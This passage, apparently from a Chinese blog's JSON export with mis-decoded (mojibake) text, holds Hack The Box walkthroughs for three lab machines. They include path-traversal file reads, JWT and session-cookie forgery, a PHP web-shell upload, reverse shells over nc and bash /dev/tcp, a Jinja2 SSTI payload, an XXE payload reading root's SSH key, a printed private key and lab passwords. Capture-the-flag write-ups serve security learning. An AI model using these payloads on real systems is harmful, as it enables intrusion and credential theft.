localhost\\r\\n#\\t::1 localhost\\r\\n&quot; æˆ‘ä»¬ä¹‹å‰ä»é”™è¯¯ä¸­çœ‹åˆ°äº†å…³äºbookController.phpæ‰€ä»¥è®©æˆ‘ä»¬å°è¯•è¯»å–æ–‡ä»¶ ../../../../../../Users/www-data/Desktop/xampp/htdocs/includes/bookController.php &quot;&lt;?php\\r\\n\\r\\nif($_SERVER[&#39;REQUEST_METHOD&#39;] == \\&quot;POST\\&quot;){\\r\\n $out = \\&quot;\\&quot;;\\r\\n require &#39;..\\/db\\/db.php&#39;;\\r\\n\\r\\n $title = \\&quot;\\&quot;;\\r\\n $author = \\&quot;\\&quot;;\\r\\n\\r\\n if($_POST[&#39;method&#39;] == 0){\\r\\n if($_POST[&#39;title&#39;] != \\&quot;\\&quot;){\\r\\n $title = \\&quot;%\\&quot;.$_POST[&#39;title&#39;].\\&quot;%\\&quot;;\\r\\n }\\r\\n if($_POST[&#39;author&#39;] != \\&quot;\\&quot;){\\r\\n $author = \\&quot;%\\&quot;.$_POST[&#39;author&#39;].\\&quot;%\\&quot;;\\r\\n }\\r\\n \\r\\n \\r\\n $query = \\&quot;SELECT * FROM books WHERE title LIKE ? OR author LIKE ?\\&quot;;\\r\\n $stmt = $con-&gt;prepare($query);\\r\\n $stmt-&gt;bind_param(&#39;ss&#39;, $title, $author);\\r\\n $stmt-&gt;execute();\\r\\n $res = $stmt-&gt;get_result();\\r\\n $out = mysqli_fetch_all($res,MYSQLI_ASSOC);\\r\\n }\\r\\n\\r\\n elseif($_POST[&#39;method&#39;] == 1){\\r\\n $out = file_get_contents(&#39;..\\/books\\/&#39;.$_POST[&#39;book&#39;]);\\r\\n }\\r\\n\\r\\n else{\\r\\n $out = false;\\r\\n }\\r\\n\\r\\n echo json_encode($out);\\r\\n}&quot; è¿™æ—¶å€™çº¿ç´¢åˆæŒ‡å‘äº†$out &#x3D; â€œâ€;\\r\\n require â€˜..&#x2F;db&#x2F;db.php å’±ä»¬å»æŸ¥çœ‹ä¸€ä¸‹db.phpæ–‡ä»¶ ../../../../../../Users/www-data/Desktop/xampp/htdocs/db/db.php &quot;&lt;?php\\r\\n\\r\\n$host=\\&quot;localhost\\&quot;;\\r\\n$port=3306;\\r\\n$user=\\&quot;bread\\&quot;;\\r\\n$password=\\&quot;jUli901\\&quot;;\\r\\n$dbname=\\&quot;bread\\&quot;;\\r\\n\\r\\n$con = new mysqli($host, $user, $password, $dbname, $port) or die (&#39;Could not connect to the database server&#39; . mysqli_connect_error());\\r\\n?&gt;\\r\\n&quot; æˆåŠŸå¾—åˆ°äº†3306ç«¯å£çš„è´¦å·å¯†ç  username = bread password = jUli901 å’±ä»¬å°è¯•ç™»å½•åˆ°mysql æç¤ºå¤±è´¥ å’±ä»¬æ¢ä¸ªæ€è·¯ï¼Œè¯»å–ä»–çš„loginé¡µé¢ï¼Œå®¡è®¡ä¸€ä¸‹ç™»å½•é€»è¾‘ ../portal/login.php å’±ä»¬ç»™ä»–å¤åˆ¶å‡ºæ¥å®¡è®¡ä¸€ä¸‹ å’±ä»¬å‘ç°å®ƒæ­£åœ¨ä½¿ç”¨authController.phpæ–‡ä»¶ï¼Œå’±ä»¬ç»§ç»­è¿½è¸ªè¿‡å»çœ‹çœ‹ å’±ä»¬çœ‹åˆ°å®ƒæœ‰ä½¿ç”¨ä¸€æ®µkeyï¼Œå’±ä»¬å¤åˆ¶å‡ºæ¥çœ‹çœ‹ $secret_key = &#39;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&#39; å’±ä»¬è¿˜èƒ½çœ‹åˆ°ï¼Œå®ƒæœ‰ä½¿ç”¨ä¸€ä¸ªJWTä»¤ç‰Œï¼Œè¿™ä¸ªä¹‹å‰å’±ä»¬ç”¨åˆ°è¿‡çš„ åŒæ—¶è¿˜è°ƒç”¨äº†ä¸€ä¸ªcookie.phpé¡µé¢ï¼Œå’±ä»¬ç»§ç»­è¿½è¸ªçœ‹çœ‹ &quot;&lt;?php\\r\\n\\/**\\r\\n * @param string $username Username requesting session cookie\\r\\n * \\r\\n * @return string $session_cookie Returns the generated cookie\\r\\n * \\r\\n * @devteam\\r\\n * Please DO NOT use default PHPSESSID; our security team says they are predictable.\\r\\n * CHANGE SECOND PART OF MD5 KEY EVERY WEEK\\r\\n * *\\/\\r\\nfunction makesession($username){\\r\\n $max = strlen($username) - 1;\\r\\n $seed = rand(0, $max);\\r\\n $key = \\&quot;s4lTy_stR1nG_\\&quot;.$username[$seed].\\&quot;(!528.\\/9890\\&quot;;\\r\\n $session_cookie = $username.md5($key);\\r\\n\\r\\n return $session_cookie;\\r\\n}&quot; æš‚æ—¶åˆ°è¿™çº¿ç´¢å°±æ–­äº†ï¼Œå’±ä»¬å»çœ‹çœ‹portalç›®å½•ä¸‹è¿˜æœ‰å•¥å§ è¯¥ç›®å½•ä¸‹æœ‰ä¸€ä¸ªfiles.phpæ–‡ä»¶ï¼Œå’±ä»¬æŸ¥çœ‹ä¸€ä¸‹ ä¸å‡ºæ„å¤–çš„è¯ï¼Œfilesçš„ç”¨æˆ·åº”è¯¥æ˜¯pauläº† å»JWT.ioåˆ›å»ºä¸€ä¸ªä»¤ç‰Œ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU å’±ä»¬å»ç™»å½• éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç„¶åç™»å½•ï¼Œç„¶åæ›¿æ¢JWTä»¤ç‰Œ &lt;?php $username = &quot;paul&quot;; $max = strlen($username) -1; $seed = rand(0, $max); $key = &quot;s4lTy_stR1nG_&quot;.$username[$seed].&quot;(!528./9890&quot;; $session_cookie = $username.md5($key); echo $session_cookie; ?&gt; ä½¿ç”¨è¯¥è„šæœ¬è·å–sessionè¿›è¡Œæ›¿æ¢ for i in {0..5};do php session.php;echo &#39;&#39;;sleep 1;done æˆåŠŸç™»å½•ä¸ºpaulè´¦æˆ· File managementä¼¼ä¹åªå…è®¸.zipæ ¼å¼çš„æ–‡ä»¶ å’±ä»¬ä¸Šä¼ ä¸€ä¸ªphpshell https://github.com/LucifielHack/p0wny-shell ä¸Šä¼ çš„æ—¶å€™ ä¼šè‡ªåŠ¨åœ¨æœ«å°¾æ·»åŠ ä¸Š.zip å’±ä»¬åœ¨æœ€æœ«å°¾å†æ‰‹åŠ¨æ·»åŠ ä¸€ä¸ª.phpå³å¯ç»•è¿‡ è¿™åªæ˜¯ä¸ªå‰ç«¯éªŒè¯ æˆåŠŸæ‹¿åˆ°ä¸€ä¸ªphpshell æ­¤å¤„æœ‰ä¸¤ä¸ªæ–¹æ³•å¾—åˆ°ä¸€ä¸ªshell æ–¹æ³•ä¸€ï¼šæŸ¥çœ‹C:\\Users\\www-data\\Desktop\\xampp\\htdocs\\portal\\pizzaDeliveryUserDataç›®å½•ä¸‹çš„juliette.jsonæ–‡ä»¶ï¼Œå³å¯å¾—åˆ°ä¸€ä¸ªè´¦å·å¯†ç ï¼Œè¿›è¡ŒSSHç™»å½• type juliette.json username = juliette password = jUli901./())! æ–¹æ³•äºŒï¼šæœ¬åœ°ä½¿ç”¨python3æ­å»ºä¸€ä¸ªhttpæœåŠ¡å™¨ï¼Œåœ¨phpshellå†…ä½¿ç”¨curlè¿›è¡Œä¸‹è½½nc.exeï¼Œç„¶åä½¿ç”¨ncè¿›è¡Œshellåå¼¹ æœ¬æœºè¿è¡Œ python3 -m http.server 80 nc -nvlp 4444 phpshellè¿è¡Œ curl [http://localhost/nc.exe -o nc.exe](http://localhost/nc.exe%20-o%20nc.exe) nc.exe localhost 4444 -e cmd.exe è¿™é‡Œçœ‹å¤§å®¶è‡ªå·±å–œæ¬¢ä»€ä¹ˆæ–¹å¼äº† æˆåŠŸè·å¾—usersæƒé™çš„flag æƒé™æå‡ å’±ä»¬æŸ¥çœ‹ä¸€ä¸‹æ¡Œé¢ä¸Štodo.htmlçš„å†…å®¹ å®ƒå£°æ˜å®ƒå°†å¯†ç å­˜å‚¨åœ¨åä¸º Microsoft Store Sticky Notes çš„ç¨‹åºä¸­ å’±ä»¬æ‰¾è¿‡å» å‚è€ƒé“¾æ¥ https://www.thewindowsclub.com/where-are-sticky-notes-saved-in-windows-10 cd C:\\Users\\juliette\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState ç°åœ¨æˆ‘ä»¬è¦æŠŠsqliteæ–‡ä»¶æä¸‹æ¥ è¿™é‡Œä»€ä¹ˆsmbå…±äº«å•Š ncä¼ è¾“å•Š æˆ–æ˜¯å…¶ä»–æ–¹å¼çš„ï¼Œå¾ˆå¤šæ–¹æ³•ï¼Œæˆ‘å°±ä¸æ¼”ç¤ºäº†ï¼Œå¤§å®¶ç”¨è‡ªå·±å–œæ¬¢çš„æ–¹æ³•æå§ã€‚æä¸‹æ¥åï¼Œåœ¨è‡ªå·±ç”µè„‘ä¸Šä¹Ÿè¦æ”¾åœ¨åŒä¸€ä½ç½®ï¼Œç„¶åè¿›è¡ŒæŸ¥çœ‹ juliette: jUli901./())! development: fN3)sN5Ee@g administrator: [MOVED] è¿™æ˜¯å’±ä»¬å¾—åˆ°çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯å¯†ç  å’±ä»¬ä½¿ç”¨sshç™»å½•developmentè¿™ä¸ªè´¦æˆ· å’±ä»¬æ£€æŸ¥ä¸€ä¸‹krypter_linux å’±ä»¬ç”¨ä¸Šé¢ç›¸åŒçš„æ”¾å¼ç»™æä¸‹æ¥ï¼Œç„¶åæŸ¥çœ‹ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç›®æ ‡æœºå™¨ä½äº1234ç«¯å£ æä»– å’±ä»¬ä½¿ç”¨sshåšä¸€ä¸ªåŠ¨æ€ç«¯å£è½¬å‘ ssh -L 1234:127.0.0.1:1234 [development@10.10.10.228](mailto:development@10.10.10.228) ç„¶åè®©æˆ‘ä»¬è®¿é—®ä¸€ä¸‹è¿™ä¸ªé¡µé¢ curl &#39;http://127.0.0.1:1234/index.php?method=select&amp;username=administrator&amp;table=passwords&#39; æˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªaeså¯†é’¥k19D193j.&lt;19391( æˆ‘ä»¬ä½¿ç”¨sqlmapè¿›è¡Œæ³¨å…¥ sqlmap -u http://127.0.0.1:1234/index.php\\?method\\=select\\&amp;username\\=administrator\\&amp;table\\=passwords --dump account = Administrator aes_key = k19D193j.&lt;19391( password = H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw= ä½¿ç”¨åœ¨çº¿å·¥å…·è¿›è¡Œè§£å¯† https://www.devglan.com/online-tools/aes-encryption-decryption cEBzc3cwcmQhQCMkOTg5MC4v æˆ‘ä»¬ä½¿ç”¨base64è¿›è¡Œè§£å¯† [p@ssw0rd!@#$9890./](mailto:p@ssw0rd!@#$9890./) ä½¿ç”¨sshç™»å½•administratorè´¦æˆ·å³å¯ ææƒadministratoræˆåŠŸ æˆåŠŸæ‹¿åˆ°rootæƒé™çš„flag æ”¶å·¥åƒå¤œå®µ","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Spider - Hackthebox","slug":"Hackthebox - Spider","date":"2021-06-17T11:38:36.000Z","updated":"2023-05-20T03:38:12.000Z","comments":true,"path":"2021/06/17/Hackthebox - Spider/","link":"","permalink":"http://www.lucifiel.com/2021/06/17/Hackthebox%20-%20Spider/","excerpt":"","text":"Hackthebox - Spideré¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›† ä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ nmap -A -sS -sV -sC 10.10.10.243 æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå­˜åœ¨22å’Œ80ç«¯å£ï¼Œå’±ä»¬è®¿é—®ä¸€ä¸‹80ç«¯å£ ä¼šè¢«é‡å®šå‘åˆ°spider.htbï¼Œå’±ä»¬å…ˆæŠŠå®ƒåŠ å…¥hostsæ–‡ä»¶å§ echo 10.10.10.243 spider.htb &gt; /etc/hosts å†è®¿é—®å¯ä»¥å‘ç°æ˜¯ä¸€ä¸ªå®¶å…·é¡µé¢ï¼Œå’±ä»¬åšä¸€ä¸‹ä¿¡æ¯æœé›† gobuster dir -u http://spider.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 50 /cart (Status: 500) \\[Size: 290\\] /checkout (Status: 500) \\[Size: 290\\] /index (Status: 200) \\[Size: 11273\\] /login (Status: 200) \\[Size: 1832\\] /logout (Status: 302) \\[Size: 209\\] \\[--&gt; http://spider.htb/\\] /main (Status: 302) \\[Size: 219\\] \\[--&gt; http://spider.htb/login\\] /register (Status: 200) \\[Size: 2130\\] /user (Status: 302) \\[Size: 219\\] \\[--&gt; http://spider.htb/login\\] /view (Status: 302) \\[Size: 219\\] \\[--&gt; [http://spider.htb/login](http://spider.htb/login)\\] æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œèƒ½è®¿é—®çš„åªæœ‰æ³¨å†Œé¡µé¢å’Œç™»å½•é¡µé¢ï¼Œå’±ä»¬å…ˆå»çœ‹çœ‹æ³¨å†Œé¡µé¢ å’±ä»¬æ³¨å†Œä¸€ä¸ªç”¨æˆ· 7443d68c-02b2-428c-b622-af15604cd905 å’±ä»¬å¾—åˆ°äº†ä¸€æ®µUUIDï¼Œä½¿ç”¨å¯†ç ç™»å½•è¯•è¯• ç™»å½•åä¼¼ä¹ä¹Ÿåªæœ‰è¿™ä¸ªé¡µé¢å¯ä»¥ç‚¹å‡»ï¼Œå’±ä»¬å†å¤šçœ‹çœ‹ åœ¨åšä¿¡æ¯æœé›†çš„æ—¶å€™ï¼Œçªç„¶é†’æ‚Ÿè¿‡æ¥ï¼Œè¿™ä¼šä¸ä¼šæ˜¯ä¸ªSSTIï¼Ÿå’±ä»¬æµ‹è¯•ä¸€ä¸‹ å’±ä»¬æµ‹è¯•ä¸€ä¸‹ ç™»é™†åæŸ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬çš„è´¦æˆ·ä¿¡æ¯ å¥½å®¶ä¼™ï¼Œç¡®å®æ˜¯ è¿™é‡Œå¯ä»¥è¿›è¡ŒSSTIæ”»å‡»ï¼Œé‚£ä¹ˆæ„å‘³ç€æœåŠ¡å™¨æ­£åœ¨è¿è¡ŒJinja2æˆ–è€…Flaskï¼Œè¿™é‡Œæ˜¯Flask æ¼æ´åˆ©ç”¨ è¿™é‡Œæˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹configä¿¡æ¯ï¼Œæ³¨å†Œä¸€ä¸ªç”¨æˆ· &lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE\\_EXCEPTIONS&#39;: None, &#39;PRESERVE\\_CONTEXT\\_ON\\_EXCEPTION&#39;: None, &#39;SECRET\\_KEY&#39;: &#39;Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942&#39;, &#39;PERMANENT\\_SESSION\\_LIFETIME&#39;: datetime.timedelta(31), &#39;USE\\_X\\_SENDFILE&#39;: False, &#39;SERVER\\_NAME&#39;: None, &#39;APPLICATION\\_ROOT&#39;: &#39;/&#39;, &#39;SESSION\\_COOKIE\\_NAME&#39;: &#39;session&#39;, &#39;SESSION\\_COOKIE\\_DOMAIN&#39;: False, &#39;SESSION\\_COOKIE\\_PATH&#39;: None, &#39;SESSION\\_COOKIE\\_HTTPONLY&#39;: True, &#39;SESSION\\_COOKIE\\_SECURE&#39;: False, &#39;SESSION\\_COOKIE\\_SAMESITE&#39;: None, &#39;SESSION\\_REFRESH\\_EACH\\_REQUEST&#39;: True, &#39;MAX\\_CONTENT\\_LENGTH&#39;: None, &#39;SEND\\_FILE\\_MAX\\_AGE\\_DEFAULT&#39;: datetime.timedelta(0, 43200), &#39;TRAP\\_BAD\\_REQUEST\\_ERRORS&#39;: None, &#39;TRAP\\_HTTP\\_EXCEPTIONS&#39;: False, &#39;EXPLAIN\\_TEMPLATE\\_LOADING&#39;: False, &#39;PREFERRED\\_URL\\_SCHEME&#39;: &#39;http&#39;, &#39;JSON\\_AS\\_ASCII&#39;: True, &#39;JSON\\_SORT\\_KEYS&#39;: True, &#39;JSONIFY\\_PRETTYPRINT\\_REGULAR&#39;: False, &#39;JSONIFY\\_MIMETYPE&#39;: &#39;application/json&#39;, &#39;TEMPLATES\\_AUTO\\_RELOAD&#39;: None, &#39;MAX\\_COOKIE\\_SIZE&#39;: 4093, &#39;RATELIMIT\\_ENABLED&#39;: True, &#39;RATELIMIT\\_DEFAULTS\\_PER\\_METHOD&#39;: False, &#39;RATELIMIT\\_SWALLOW\\_ERRORS&#39;: False, &#39;RATELIMIT\\_HEADERS\\_ENABLED&#39;: False, &#39;RATELIMIT\\_STORAGE\\_URL&#39;: &#39;memory://&#39;, &#39;RATELIMIT\\_STRATEGY&#39;: &#39;fixed-window&#39;, &#39;RATELIMIT\\_HEADER\\_RESET&#39;: &#39;X-RateLimit-Reset&#39;, &#39;RATELIMIT\\_HEADER\\_REMAINING&#39;: &#39;X-RateLimit-Remaining&#39;, &#39;RATELIMIT\\_HEADER\\_LIMIT&#39;: &#39;X-RateLimit-Limit&#39;, &#39;RATELIMIT\\_HEADER\\_RETRY\\_AFTER&#39;: &#39;Retry-After&#39;, &#39;UPLOAD\\_FOLDER&#39;: &#39;static/uploads&#39;}&gt; æˆ‘ä»¬å¾—åˆ°äº†ç›¸å…³çš„é…ç½®ä¿¡æ¯ æˆ‘ä»¬ç­›é€‰ä¸€ä¸‹å…¶ä¸­çš„å…³é”®ä¿¡æ¯ secret\\_key = Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942 é¦–å…ˆå®‰è£…ä¸€ä¸‹å’±ä»¬éœ€è¦çš„æ¨¡å— pip3 install flask_unsign ç„¶åå’±ä»¬ä½¿ç”¨sqlmapçš„evalå¤„ç†sessionå‚æ•° sqlmap http://spider.htb/ --eval &quot;from flask\\_unsign import session as s; session = s.sign({&#39;uuid&#39;: session}, secret=&#39;Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942&#39;)&quot; --cookie=&quot;session=\\*&quot; --delay 1 --dump ç¬¬ä¸€ä¸ªé€‰é¡¹è¾“å…¥Yï¼Œåé¢çš„éƒ½è¾“å…¥N æˆåŠŸå¾—åˆ°uuidå’Œpassword uuid = 129f60ea-30cf-4065-afb9-6be45ad38b73 password = ch1VW4sHERE7331 å’±ä»¬å»ç™»å½• å•Šå“ˆï¼Œè¿™æ¬¡å‡ºç°ä¸ä¸€æ ·çš„ç•Œé¢äº† è®©æˆ‘ä»¬å»æ£€æŸ¥ä¸€ä¸‹messages /a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal å’±ä»¬å¾—åˆ°äº†ä¸€ä¸ªé“¾æ¥ï¼Œå»è®¿é—®ä¸€ä¸‹ http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal é¦–å…ˆè®©æˆ‘ä»¬æ„é€ payload bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/10.10.14.54/4444 &lt;&amp;1&#39; ç„¶åè½¬åŒ–ä¸ºbase64æ ¼å¼ YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNTQvNDQ0NCA8JjEn ç„¶åæ„é€ poc {% with a = request\\[\"application\"\\]\\[\"\\\\x5f\\\\x5fglobals\\\\x5f\\\\x5f\"\\]\\[\"\\\\x5f\\\\x5fbuiltins\\\\x5f\\\\x5f\"\\][\"\\\\x5f\\\\x5fimport\\\\x5f\\\\x5f\"](\"os\")[\"popen\"](\"echo -n YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNTQvNDQ0NCA8JjEn | base64 -d | bash\")\\[\"read\"\\]() %} a {% endwith %} ç„¶åæœ¬åœ°ç›‘å¬ä¸€ä¸ªç«¯å£ nc -nvlp 4444 æˆåŠŸgetshell æˆåŠŸæ‹¿åˆ°useræƒé™çš„flag æƒé™æå‡ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°&#x2F;home&#x2F;chivç›®å½•ä¸‹å­˜åœ¨.sshç›®å½•ï¼Œé‚£åº”è¯¥æ˜¯å­˜åœ¨å¯†é’¥çš„ï¼Œå’±ä»¬è¿›å»çœ‹çœ‹ æˆåŠŸæ‹¿åˆ°ç§é’¥ -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEAmGvQ3kClVX7pOTDIdNTsQ5EzQl+ZLbpRwDgicM4RuWDvDqjV gjWRBF5B75h/aXjIwUnMXA7XimrfoudDzjynegpGDZL2LHLsVnTkYwDq+o/MnkpS U7tVc2i/LtGvrobrzNRFX8taAOQ561iH9xnR2pPGwHSF1/rHQqaikl9t85ESdrp9 MI+JsgXF4qwdo/zrgxGdcOa7zq6zlnwYlY2zPZZjHYxrrwbJiD7H2pQNiegBQgu7 BLRlsGclItrZB+p4w6pi0ak8NcoKVdeOLpQq0i58vXUCGqtp9iRA0UGv3xmHakM2 VTZrVb7Q0g5DGbEXcIW9oowFXD2ufo2WPXym0QIDAQABAoIBAH4cNqStOB6U8sKu 6ixAP3toF9FC56o+DoXL7DMJTQDkgubOKlmhmGrU0hk7Q7Awj2nddYh1f0C3THGs hx2MccU32t5ASg5cx86AyLZhfAn0EIinVZaR2RG0CPrj40ezukWvG/c2eTFjo8hl Z5m7czY2LqvtvRAGHfe3h6sz6fUrPAkwLTl6FCnXL1kCEUIpKaq5wKS1xDHma3Pc XVQU8a7FwiqCiRRI+GqJMY0+uq8/iao20jF+aChGu2cAP78KAyQU4NIsKNnewIrq 54dWOw8lwOXp2ndmo3FdOfjm1SMNYtB5yvPR9enbu3wkX94fC/NS9OqLLMzZfYFy f0EMoUECgYEAxuNi/9sNNJ6UaTlZTsn6Z8X/i4AKVFgUGw4sYzswWPC4oJTDDB62 nKr2o33or9dTVdWki1jI41hJCczx2gRqCGtu0yO3JaCNY5bCA338YymdVkphR9TL j0UOJ1vHU06RFuD28orK+w0b+gVanQIiz/o57xZ1sVNaNOyJUlsenh8CgYEAxDCO JjFKq+0+Byaimo8aGjFiPQFMT2fmOO1+/WokN+mmKLyVdh4W22rVV4v0hn937EPW K1Oc0/hDtSSHSwI/PSN4C2DVyOahrDcPkArfOmBF1ozcR9OBAJME0rnWJm6uB7Lv hm1Ll0gGJZ/oeBPIssqG1srvUNL/+sPfP3x8PQ8CgYEAqsuqwL2EYaOtH4+4OgkJ mQRXp5yVQklBOtq5E55IrphKdNxLg6T8fR30IAKISDlJv3RwkZn1Kgcu8dOl/eu8 gu5/haIuLYnq4ZMdmZIfo6ihDPFjCSScirRqqzINwmS+BD+80hyOo3lmhRcD8cFb 0+62wbMv7s/9r2VRp//IE1ECgYAHf7efPBkXkzzgtxhWAgxEXgjcPhV1n4oMOP+2 nfz+ah7gxbyMxD+paV74NrBFB9BEpp8kDtEaxQ2Jefj15AMYyidHgA8L28zoMT6W CeRYbd+dgMrWr/3pULVJfLLzyx05zBwdrkXKZYVeoMsY8+Ci/NzEjwMwuq/wHNaG rbJt/wKBgQCTNzPkU50s1Ad0J3kmCtYo/iZN62poifJI5hpuWgLpWSEsD05L09yO TTppoBhfUJqKnpa6eCPd+4iltr2JT4rwY4EKG0fjWWrMzWaK7GnW45WFtCBCJIf6 IleM+8qziZ8YcxqeKNdpcTZkl2VleDsZpkFGib0NhKaDN9ugOgpRXw== -----END RSA PRIVATE KEY----- ä¿å­˜åˆ°æœ¬åœ° ä½¿ç”¨sshè¿›è¡Œç™»å½• ç™»å½•æˆåŠŸ æŸ¥çœ‹ä¸€ä¸‹æ­£åœ¨è¿è¡Œçš„ç«¯å£ ss -tupln å’±ä»¬å‘ç°æœ¬åœ°è¿è¡Œç€8080ç«¯å£ å’±ä»¬éœ€è¦æŠŠç«¯å£è½¬å‘å‡ºæ¥ ssh -i id\\_chiv -L 8080:localhost:8080 chiv@spider.htb ç„¶åå’±ä»¬æ‰“å¼€firefoxè¿›è¡Œè®¿é—®http://127.0.0.1:8080/ ç«¯å£è½¬å‘æˆåŠŸ è¿™è¾¹éšä¾¿ä¸€ä¸ªè´¦æˆ·éƒ½å¯ä»¥ç™»å½• å’±ä»¬æŸ¥çœ‹ä¸€ä¸‹cookieï¼Œè¿™é‡Œcookieéœ€è¦è§£å¯† .eJw1jE1PwyAAhv-K4eyB1u3SZJcKtHZChfLRcbNhCa3Q1clhbtl\\_d9N4fPM8z3sB4RQDKC7gYQAFUJgRh0-SfzRamDTrmJm9od9Dbcd3RVayWkqnMsR7QTUSrwr7rYsvZ9UldONzp1jZkqUWU2nv\\_L4tDIgb13CIV5b4dqhYYsaPOlNHqUWzDyVqJZlosOtdzCpHFsVwuvl\\_f7-99N7gdTTada4iPXtOTNQu32nf2hB6NQuvz\\_zI8\\_DvUxqag8WObCH7dE92GmTILebwjW824PoIlsM4py9QwOsPiZ9VQg.YMsGpQ.L71-NNdbcE09uMjZzZWHHG-Zytw ä½¿ç”¨flask-unsignè¿›è¡Œè§£ç  flask-unsign --decode --cookie .eJw1jE1PwyAAhv-K4eyB1u3SZJcKtHZChfLRcbNhCa3Q1clhbtl\\_d9N4fPM8z3sB4RQDKC7gYQAFUJgRh0-SfzRamDTrmJm9od9Dbcd3RVayWkqnMsR7QTUSrwr7rYsvZ9UldONzp1jZkqUWU2nv\\_L4tDIgb13CIV5b4dqhYYsaPOlNHqUWzDyVqJZlosOtdzCpHFsVwuvl\\_f7-99N7gdTTada4iPXtOTNQu32nf2hB6NQuvz\\_zI8\\_DvUxqag8WObCH7dE92GmTILebwjW824PoIlsM4py9QwOsPiZ9VQg.YMsGpQ.L71-NNdbcE09uMjZzZWHHG-Zytw è¿”å›äº†ä¸€æ®µbase64ç  {&#39;lxml&#39;: b&#39;PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+MTIzPC91c2VybmFtZT4KICAgICAgICA8aXNfYWRtaW4+MDwvaXNfYWRtaW4+CiAgICA8L2RhdGE+Cjwvcm9vdD4=&#39;, &#39;points&#39;: 0} å’±ä»¬è§£å¯†ä¸€ä¸‹ å’±ä»¬æŸ¥çœ‹æºä»£ç  æˆ‘ä»¬åœ¨ç™»å½•é¡µé¢çš„æºä»£ç ä¸­å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªhiddenå€¼ï¼Œæ‰€ä»¥å’±ä»¬å¯ä»¥åˆ©ç”¨XXEæ”»å‡» å‚è€ƒé“¾æ¥ https://github.com/LucifielHack/PayloadsAllTheThings/tree/master/XXE%20Injection å’±ä»¬æ„é€ ä¸€ä¸ªpoc username=%26username%3b&amp;version=1.0.0--&gt;&lt;!DOCTYPE+foo+\\[&lt;!ENTITY+username+SYSTEM+&quot;/root/.ssh/id\\_rsa&quot;&gt;+\\]&gt;&lt;!-- ç„¶åä½¿ç”¨burpæŠ“ä¸ªåŒ… ç„¶åå’±ä»¬åŠ å…¥æ„é€ çš„poc æˆåŠŸè·å¾—rootç”¨æˆ·çš„å¯†é’¥ å’±ä»¬ä¿å­˜åˆ°æœ¬åœ° ä½¿ç”¨å¯†é’¥è¿›è¡Œç™»å½• æˆåŠŸç™»å½•rootæƒé™ æˆåŠŸæ‹¿åˆ°rootæƒé™çš„flag","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Tentacle - Hackthebox","slug":"Hackthebox - Tentacle","date":"2021-06-16T11:38:36.000Z","updated":"2023-05-20T03:16:41.000Z","comments":true,"path":"2021/06/16/Hackthebox - Tentacle/","link":"","permalink":"http://www.lucifiel.com/2021/06/16/Hackthebox%20-%20Tentacle/","excerpt":"","text":"Hackthebox - Tentacleé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›† ä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ nmap -A -sS -sC -sV 10.10.10.224 æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå¼€å¯äº†22ã€53ã€88ã€3128ã€9090å‡ ä¸ªç«¯å£ é¦–å…ˆè®©æˆ‘ä»¬çœ‹çœ‹3128ç«¯å£å§ï¼Œè¿™ä¸ªç«¯å£æ˜¯Squidä»£ç†çš„é»˜è®¤ç«¯å£ï¼Œæˆ‘ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡é‡åˆ°ï¼Œæ¯”è¾ƒæ„Ÿå…´è¶£ è¿™é‡ŒæŠ¥é”™äº†ï¼Œä½†æ˜¯ç»™å‡ºäº†ä¸€ä¸ªåŸŸårealcorp.htb ç»è¿‡æµ‹è¯•ï¼Œè¯¥åŸŸåçš„ç”¨æ³•æ˜¯ä½¿ç”¨è¿™ä¸ªåŸŸåæ¥è¿›è¡Œå­åŸŸåæšä¸¾ï¼Œè¿™é‡Œä½¿ç”¨dnsenumè¿›è¡Œæšä¸¾ dnsenum â€“threads 64 â€“dnsserver 10.10.10.224 -f &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;DNS&#x2F;subdomains-top1million-110000.txt realcorp.htb ns.realcorp.htb. 259200 IN A 10.197.243.77 proxy.realcorp.htb. 259200 IN CNAME ns.realcorp.htb. ns.realcorp.htb. 259200 